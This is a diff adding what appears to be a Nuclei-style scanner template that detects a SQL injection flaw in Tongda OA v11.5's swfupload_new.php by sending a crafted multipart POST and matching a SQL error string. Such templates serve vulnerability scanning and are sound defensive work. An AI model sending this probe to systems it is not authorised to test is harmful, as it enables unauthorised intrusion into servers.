@@ -1,0 +1,51 @@
+id: 通达OA v11.5 swfupload_new.php 文件存在SQL注入漏洞
+time: "2022-08-02"
+
+info:
+  name: 通达OA v11.5 swfupload_new.php
+  author: pikpikcu
+  severity: critical
+  description: 通达OA v11.5 swfupload_new.php 文件存在SQL注入漏洞，攻击者通过漏洞可获取服务器敏感信息
+  tags: tongda,lfi
+
+http:
+  - method: 
+      - POST
+    path:
+      - "{{BaseURL}}/general/file_folder/swfupload_new.php"
+    Rheader:
+      - Content-Type:multipart/form-data; boundary=----------GFioQpMK0vv2 & Accept-Encoding:gzip
+    body: 
+      - |
+        ------------GFioQpMK0vv2
+        Content-Disposition: form-data; name="ATTACHMENT_ID"
+
+        1
+        ------------GFioQpMK0vv2
+        Content-Disposition: form-data; name="ATTACHMENT_NAME"
+
+        1
+        ------------GFioQpMK0vv2
+        Content-Disposition: form-data; name="FILE_SORT"
+
+        2
+        ------------GFioQpMK0vv2
+        Content-Disposition: form-data; name="SORT_ID"
+
+        ------------GFioQpMK0vv2--
+
+        
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'SQL语句'
+        condition: and
+      
+      - type: status
+        status:
+          - 200
+
+# Enhanced by mp on 2022/05/30
